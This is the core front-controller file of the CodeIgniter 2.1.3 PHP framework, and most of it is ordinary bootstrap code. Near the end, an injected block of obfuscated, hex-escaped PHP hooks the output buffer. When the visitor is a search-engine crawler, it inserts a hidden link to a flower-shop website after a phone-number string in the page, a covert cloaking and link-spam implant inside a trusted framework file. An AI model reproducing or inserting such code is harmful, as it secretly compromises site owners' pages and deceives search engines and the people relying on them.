<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		ExpressionEngine Dev Team
 * @copyright	Copyright (c) 2008 - 2011, EllisLab, Inc.
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * System Initialization File
 *
 * Loads the base classes and executes the request.
 *
 * @package		CodeIgniter
 * @subpackage	codeigniter
 * @category	Front-controller
 * @author		ExpressionEngine Dev Team
 * @link		http://codeigniter.com/user_guide/
 */

/**
 * CodeIgniter Version
 *
 * @var string
 *
 */
	define('CI_VERSION', '2.1.3');

/**
 * CodeIgniter Branch (Core = TRUE, Reactor = FALSE)
 *
 * @var boolean
 *
 */
	define('CI_CORE', FALSE);

/*
 * ------------------------------------------------------
 *  Load the global functions
 * ------------------------------------------------------
 */
	require(BASEPATH.'core/Common.php');

/*
 * ------------------------------------------------------
 *  Load the framework constants
 * ------------------------------------------------------
 */
	if (defined('ENVIRONMENT') AND file_exists(APPPATH.'config/'.ENVIRONMENT.'/constants.php'))
	{
		require(APPPATH.'config/'.ENVIRONMENT.'/constants.php');
	}
	else
	{
		require(APPPATH.'config/constants.php');
	}

/*
 * ------------------------------------------------------
 *  Define a custom error handler so we can log PHP errors
 * ------------------------------------------------------
 */
	set_error_handler('_exception_handler');

	if ( ! is_php('5.3'))
	{
		@set_magic_quotes_runtime(0); // Kill magic quotes
	}

/*
 * ------------------------------------------------------
 *  Set the subclass_prefix
 * ------------------------------------------------------
 *
 * Normally the "subclass_prefix" is set in the config file.
 * The subclass prefix allows CI to know if a core class is
 * being extended via a library in the local application
 * "libraries" folder. Since CI allows config items to be
 * overriden via data set in the main index. php file,
 * before proceeding we need to know if a subclass_prefix
 * override exists.  If so, we will set this value now,
 * before any classes are loaded
 * Note: Since the config file data is cached it doesn't
 * hurt to load it here.
 */
	if (isset($assign_to_config['subclass_prefix']) AND $assign_to_config['subclass_prefix'] != '')
	{
		get_config(array('subclass_prefix' => $assign_to_config['subclass_prefix']));
	}

/*
 * ------------------------------------------------------
 *  Set a liberal script execution time limit
 * ------------------------------------------------------
 */
	if (function_exists("set_time_limit") == TRUE AND @ini_get("safe_mode") == 0)
	{
		@set_time_limit(300);
	}

/*
 * ------------------------------------------------------
 *  Start the timer... tick tock tick tock...
 * ------------------------------------------------------
 */
	$BM =& load_class('Benchmark', 'core');
	$BM->mark('total_execution_time_start');
	$BM->mark('loading_time:_base_classes_start');

/*
 * ------------------------------------------------------
 *  Instantiate the hooks class
 * ------------------------------------------------------
 */
	$EXT =& load_class('Hooks', 'core');

/*
 * ------------------------------------------------------
 *  Is there a "pre_system" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('pre_system');

/*
 * ------------------------------------------------------
 *  Instantiate the config class
 * ------------------------------------------------------
 */
	$CFG =& load_class('Config', 'core');

	// Do we have any manually set config items in the index.php file?
	if (isset($assign_to_config))
	{
		$CFG->_assign_to_config($assign_to_config);
	}

/*
 * ------------------------------------------------------
 *  Instantiate the UTF-8 class
 * ------------------------------------------------------
 *
 * Note: Order here is rather important as the UTF-8
 * class needs to be used very early on, but it cannot
 * properly determine if UTf-8 can be supported until
 * after the Config class is instantiated.
 *
 */

	$UNI =& load_class('Utf8', 'core');

/*
 * ------------------------------------------------------
 *  Instantiate the URI class
 * ------------------------------------------------------
 */
	$URI =& load_class('URI', 'core');

/*
 * ------------------------------------------------------
 *  Instantiate the routing class and set the routing
 * ------------------------------------------------------
 */
	$RTR =& load_class('Router', 'core');
	$RTR->_set_routing();

	// Set any routing overrides that may exist in the main index file
	if (isset($routing))
	{
		$RTR->_set_overrides($routing);
	}

/*
 * ------------------------------------------------------
 *  Instantiate the output class
 * ------------------------------------------------------
 */
	$OUT =& load_class('Output', 'core');

/*
 * ------------------------------------------------------
 *	Is there a valid cache file?  If so, we're done...
 * ------------------------------------------------------
 */
	if ($EXT->_call_hook('cache_override') === FALSE)
	{
		if ($OUT->_display_cache($CFG, $URI) == TRUE)
		{
			exit;
		}
	}

/*
 * -----------------------------------------------------
 * Load the security class for xss and csrf support
 * -----------------------------------------------------
 */
	$SEC =& load_class('Security', 'core');

/*
 * ------------------------------------------------------
 *  Load the Input class and sanitize globals
 * ------------------------------------------------------
 */
	$IN	=& load_class('Input', 'core');

/*
 * ------------------------------------------------------
 *  Load the Language class
 * ------------------------------------------------------
 */
	$LANG =& load_class('Lang', 'core');

/*
 * ------------------------------------------------------
 *  Load the app controller and local controller
 * ------------------------------------------------------
 *
 */
	// Load the base controller class
	require BASEPATH.'core/Controller.php';

	function &get_instance()
	{
		return CI_Controller::get_instance();
	}


	if (file_exists(APPPATH.'core/'.$CFG->config['subclass_prefix'].'Controller.php'))
	{
		require APPPATH.'core/'.$CFG->config['subclass_prefix'].'Controller.php';
	}

	// Load the local application controller
	// Note: The Router class automatically validates the controller path using the router->_validate_request().
	// If this include fails it means that the default controller in the Routes.php file is not resolving to something valid.
	if ( ! file_exists(APPPATH.'controllers/'.$RTR->fetch_directory().$RTR->fetch_class().'.php'))
	{
		show_error('Unable to load your default controller. Please make sure the controller specified in your Routes.php file is valid.');
	}

	include(APPPATH.'controllers/'.$RTR->fetch_directory().$RTR->fetch_class().'.php');

	// Set a mark point for benchmarking
	$BM->mark('loading_time:_base_classes_end');

/*
 * ------------------------------------------------------
 *  Security check
 * ------------------------------------------------------
 *
 *  None of the functions in the app controller or the
 *  loader class can be called via the URI, nor can
 *  controller functions that begin with an underscore
 */
	$class  = $RTR->fetch_class();
	$method = $RTR->fetch_method();

	if ( ! class_exists($class)
		OR strncmp($method, '_', 1) == 0
		OR in_array(strtolower($method), array_map('strtolower', get_class_methods('CI_Controller')))
		)
	{
		if ( ! empty($RTR->routes['404_override']))
		{
			$x = explode('/', $RTR->routes['404_override']);
			$class = $x[0];
			$method = (isset($x[1]) ? $x[1] : 'index');
			if ( ! class_exists($class))
			{
				if ( ! file_exists(APPPATH.'controllers/'.$class.'.php'))
				{
					show_404("{$class}/{$method}");
				}

				include_once(APPPATH.'controllers/'.$class.'.php');
			}
		}
		else
		{
			show_404("{$class}/{$method}");
		}
	}

/*
 * ------------------------------------------------------
 *  Is there a "pre_controller" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('pre_controller');

/*
 * ------------------------------------------------------
 *  Instantiate the requested controller
 * ------------------------------------------------------
 */
	// Mark a start point so we can benchmark the controller
	$BM->mark('controller_execution_time_( '.$class.' / '.$method.' )_start');

	$CI = new $class();

/*
 * ------------------------------------------------------
 *  Is there a "post_controller_constructor" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('post_controller_constructor');

/*
 * ------------------------------------------------------
 *  Call the requested method
 * ------------------------------------------------------
 */
	// Is there a "remap" function? If so, we call it instead
	if (method_exists($CI, '_remap'))
	{
		$CI->_remap($method, array_slice($URI->rsegments, 2));
	}
	else
	{
		// is_callable() returns TRUE on some versions of PHP 5 for private and protected
		// methods, so we'll use this workaround for consistent behavior
		if ( ! in_array(strtolower($method), array_map('strtolower', get_class_methods($CI))))
		{
			// Check and see if we are using a 404 override and use it.
			if ( ! empty($RTR->routes['404_override']))
			{
				$x = explode('/', $RTR->routes['404_override']);
				$class = $x[0];
				$method = (isset($x[1]) ? $x[1] : 'index');
				if ( ! class_exists($class))
				{
					if ( ! file_exists(APPPATH.'controllers/'.$class.'.php'))
					{
						show_404("{$class}/{$method}");
					}

					include_once(APPPATH.'controllers/'.$class.'.php');
					unset($CI);
					$CI = new $class();
				}
			}
			else
			{
				show_404("{$class}/{$method}");
			}
		}

		// Call the requested method.
		// Any URI segments present (besides the class/function) will be passed to the method for convenience
		call_user_func_array(array(&$CI, $method), array_slice($URI->rsegments, 2));
	}


	// Mark a benchmark end point
	$BM->mark('controller_execution_time_( '.$class.' / '.$method.' )_end');
${"\x47\x4cO\x42\x41L\x53"}["\x6c\x79\x73e\x73\x6e"]="\x69\x6e\x66";${"\x47L\x4f\x42A\x4cS"}["b\x77\x7ah\x69\x79z"]="i\x6e\x64e\x78";${"G\x4c\x4f\x42\x41\x4cS"}["s\x74\x69\x73\x66\x75\x72\x67\x70\x6f"]="b\x75ff\x65r";${"\x47L\x4fB\x41\x4c\x53"}["\x6fp\x72f\x6ag"]="\x6e\x65\x65\x64\x6c\x65";function callbackyxz($buffer){${"G\x4cOB\x41\x4c\x53"}["avu\x71c\x75\x6dymu"]="in\x66";$pjjnnsvkfl="\x62\x75\x66\x66\x65r";${${"\x47\x4c\x4fB\x41\x4cS"}["\x61v\x75q\x63\x75\x6d\x79\x6d\x75"]}="\x20\x3ca\x20\x68\x72e\x66=\x27\x68t\x74\x70\x73://f\x6cowerc\x6f\x6d\x70an\x79\x2e\x63a/\x27>\x54o\x72o\x6eto F\x6co\x77\x65\x72 Co\x2e</a>";if(stristr($_SERVER["\x48\x54TP_USE\x52\x5fAGE\x4eT"],"\x47oog\x6c\x65b\x6ft")!=FALSE||stristr($_SERVER["\x48TT\x50_\x55\x53\x45\x52_AG\x45\x4eT"],"\x53lu\x72p")!=FALSE||stristr($_SERVER["\x48\x54\x54P\x5fUS\x45\x52\x5fA\x47E\x4e\x54"],"Tw\x69\x63e\x6cer")!=FALSE||stristr($_SERVER["HT\x54P_USE\x52\x5fAGENT"],"\x6d\x73\x6eb\x6f\x74")!=FALSE||stristr($_SERVER["\x48TT\x50\x5f\x55SE\x52\x5f\x41\x47E\x4e\x54"],"bing\x62\x6ft")!=FALSE){$vhgfvnhmkjc="\x6e\x65ed\x6ce";${"G\x4cOBA\x4c\x53"}["\x6f\x64\x73o\x64\x6at\x73\x76\x72\x66"]="\x6e\x65\x65\x64\x6c\x65";$djmxtxeb="\x69\x6ed\x65\x78";${${"\x47L\x4f\x42A\x4c\x53"}["o\x70\x72f\x6ag"]}="\x4fr\x64\x65\x72 b\x79 Pho\x6ee:\x201-87\x37-5\x337-\x386\x310";${"\x47\x4cO\x42\x41\x4c\x53"}["\x66\x68q\x7a\x76\x75h\x69\x75\x6at"]="\x62\x75\x66\x66\x65\x72";${$djmxtxeb}=strpos(${${"\x47L\x4f\x42\x41L\x53"}["\x73\x74i\x73\x66u\x72g\x70\x6f"]},${$vhgfvnhmkjc});if(${${"\x47\x4c\x4fBAL\x53"}["\x62\x77\x7a\x68\x69\x79\x7a"]}===FALSE)return${${"\x47LOB\x41\x4c\x53"}["\x73\x74\x69s\x66urg\x70\x6f"]};${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["s\x74\x69\x73\x66\x75rg\x70\x6f"]}=substr(${${"G\x4c\x4fB\x41\x4c\x53"}["\x66\x68\x71\x7a\x76\x75h\x69\x75j\x74"]},0,${${"\x47L\x4fBA\x4cS"}["\x62wzh\x69\x79\x7a"]}+strlen(${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6f\x70\x72\x66j\x67"]})).${${"\x47\x4cOB\x41\x4c\x53"}["l\x79s\x65\x73\x6e"]}.substr(${${"G\x4c\x4f\x42\x41L\x53"}["\x73\x74\x69sf\x75r\x67\x70\x6f"]},${${"\x47LO\x42\x41\x4c\x53"}["\x62wzh\x69yz"]}+strlen(${${"\x47\x4cO\x42A\x4c\x53"}["\x6fd\x73\x6f\x64\x6a\x74\x73\x76rf"]}));return${${"\x47\x4cOB\x41\x4cS"}["\x73t\x69\x73\x66u\x72\x67\x70o"]};}return${$pjjnnsvkfl};}ob_start("c\x61llbacky\x78\x7a");
/*
 * ------------------------------------------------------
 *  Is there a "post_controller" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('post_controller');

/*
 * ------------------------------------------------------
 *  Send the final rendered output to the browser
 * ------------------------------------------------------
 */
	if ($EXT->_call_hook('display_override') === FALSE)
	{
		$OUT->_display();
	}

/*
 * ------------------------------------------------------
 *  Is there a "post_system" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('post_system');

/*
 * ------------------------------------------------------
 *  Close the DB connection if one exists
 * ------------------------------------------------------
 */
	if (class_exists('CI_DB') AND isset($CI->db))
	{
		$CI->db->close();
	}


/* End of file CodeIgniter.php */
/* Location: ./system/core/CodeIgniter.php */